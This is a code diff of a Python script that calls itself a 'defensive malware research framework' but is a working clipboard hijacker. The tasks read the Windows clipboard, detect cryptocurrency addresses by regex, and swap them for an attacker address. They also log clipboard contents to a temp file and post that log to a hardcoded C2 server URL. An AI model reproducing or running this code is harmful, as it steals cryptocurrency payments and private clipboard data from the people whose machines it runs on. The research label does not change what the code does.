@@ -1,48 +1,45 @@
 #!/usr/bin/env python3
+"""Merged Modules for Defensive Malware Research Framework"""
+
 import sys
 import json
 import time
 import re
-import ctypes
-from typing import Dict, Any
+import win32clipboard
 import os
 import requests
+from typing import Dict, Any
+
+def is_crypto_address(text: str) -> bool:
+    # Simple regex patterns for common cryptocurrency addresses
+    patterns = [
+        r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',  # Bitcoin
+        r'^0x[a-fA-F0-9]{40}$',                   # Ethereum
+        r'^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$',    # Litecoin
+        r'^r[0-9a-zA-Z]{24,34}$'                  # Ripple
+    ]
+    for pattern in patterns:
+        if re.match(pattern, text):
+            return True
+    return False
+
+def get_clipboard_content() -> str:
+    win32clipboard.OpenClipboard()
+    try:
+        data = win32clipboard.GetClipboardData()
+    except TypeError:
+        data = ''
+    finally:
+        win32clipboard.CloseClipboard()
+    return data
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Define regex pattern for cryptocurrency addresses (simplified)
-        crypto_patterns = [
-            r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',  # Bitcoin
-            r'^0x[a-fA-F0-9]{40}$',                  # Ethereum
-            r'^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$',   # Litecoin
-        ]
-
-        # Access clipboard content
-        CF_TEXT = 1
-        kernel32 = ctypes.windll.kernel32
-        user32 = ctypes.windll.user32
-
-        user32.OpenClipboard(0)
-        try:
-            if user32.IsClipboardFormatAvailable(CF_TEXT):
-                handle = user32.GetClipboardData(CF_TEXT)
-                data = ctypes.c_char_p(handle).value
-                clipboard_content = data.decode('utf-8')
-            else:
-                clipboard_content = ''
-        finally:
-            user32.CloseClipboard()
-
-        # Check if clipboard content matches any crypto pattern
-        is_crypto = any(re.match(pattern, clipboard_content) for pattern in crypto_patterns)
-
-        result = {
-            'content': clipboard_content,
-            'is_crypto': is_crypto
-        }
-
+        content = get_clipboard_content()
+        is_crypto = is_crypto_address(content)
+        result = {'content': content, 'is_crypto': is_crypto}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
@@ -54,21 +51,21 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extracting input data
+        # Extract input data
         content = input_data.get('content', '')
         is_crypto = input_data.get('is_crypto', False)
-        
-        # Attacker-controlled replacement address
-        attacker_address = "1AttackerAddressExample1234567890"
+
+        # Define the attacker's cryptocurrency address
+        attacker_address = "attacker_crypto_address"
 
         # Initialize result dictionary
         result = {
             "replaced": False,
             "original": content,
-            "replacement": ""
+            "replacement": content
         }
 
-        # Check if the content is a cryptocurrency address
+        # Check if the content is a cryptocurrency address and replace it
         if is_crypto:
             result["replaced"] = True
             result["replacement"] = attacker_address
@@ -76,9 +73,7 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result on failure
-        return {'success': False, 'data': {'replaced': False},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
@@ -90,51 +85,57 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         is_crypto = input_data.get('is_crypto', False)
 
         # Define the log file path
-        log_directory = os.path.join(os.environ.get('APPDATA', ''), 'ClipboardLogs')
-        os.makedirs(log_directory, exist_ok=True)
-        log_path = os.path.join(log_directory, 'clipboard_log.txt')
+        log_file_path = os.path.join(os.environ['TEMP'], 'clipboard_log.txt')
 
         # Log the clipboard content
-        with open(log_path, 'a', encoding='utf-8') as log_file:
-            log_file.write(f"Content: {content}\n")
-            log_file.write(f"Is Crypto: {is_crypto}\n")
-            log_file.write(f"Timestamp: {time.ctime()}\n\n")
+        with open(log_file_path, 'a') as log_file:
+            log_file.write(f"Crypto: {is_crypto}, Content: {content}\n")
 
-        result = {'log_path': log_path}
+        result = {
+            'logged': True,
+            'log_file_path': log_file_path
+        }
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        # Return partial result with fallback value on failure
-        return {'success': False, 'data': {'log_path': ''}, 'error': f'{type(e).__name__}: {e}',
+        result = {
+            'logged': False,
+            'log_file_path': ''
+        }
+        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        log_path = input_data.get('log_path', '')
+        logged = input_data.get('logged', False)
+        log_file_path = input_data.get('log_file_path', '')
         exfiltrated = False
+        destination = ''
 
-        # Read the log file content
-        with open(log_path, 'r') as log_file:
-            log_content = log_file.read()
+        if logged and log_file_path:
+            try:
+                with open(log_file_path, 'r') as log_file:
+                    log_content = log_file.read()
 
-        # Define the C2 server URL
-        c2_server_url = "https://192.168.62.58/api"
+                # Send the log content to the C2 server
+                c2_server_url = "https://192.168.79.193/api"
+                response = requests.post(c2_server_url, data={'log_content': log_content}, timeout=10)
 
-        # Send the log content to the C2 server
-        response = requests.post(c2_server_url, data={'log_content': log_content}, timeout=10)
+                if response.status_code == 200:
+                    exfiltrated = True
+                    destination = c2_server_url
 
-        # Check if the request was successful
-        if response.status_code == 200:
-            exfiltrated = True
+            except Exception as e:
+                # Log file reading or network error
+                pass
 
-        result = {'exfiltrated': exfiltrated}
+        result = {'exfiltrated': exfiltrated, 'destination': destination}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'exfiltrated': False},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
 
 def main() -> dict:
@@ -175,7 +176,7 @@ def main() -> dict:
         failed.append('T2')
         results['T2'] = {'success': False, 'error': str(e)}
     
-    # ── T3: Log Clipboard Content [data-processing] ──
+    # ── T3: Log Clipboard Content [collection] ──
     try:
         r = task_T3(outputs.get('T1', {}))
         results['T3'] = r
